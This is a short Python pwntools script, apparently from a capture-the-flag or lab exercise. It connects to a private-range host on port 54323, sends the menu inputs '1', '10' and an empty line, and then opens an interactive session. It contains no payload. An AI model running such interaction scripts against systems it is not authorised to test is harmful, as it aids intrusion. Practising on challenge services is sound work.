from pwn import *
context.log_level="debug"

r=remote("10.45.1.2",54323)
r.sendline(b'1')
r.sendline(b'10')
r.sendline(b'')
r.interactive()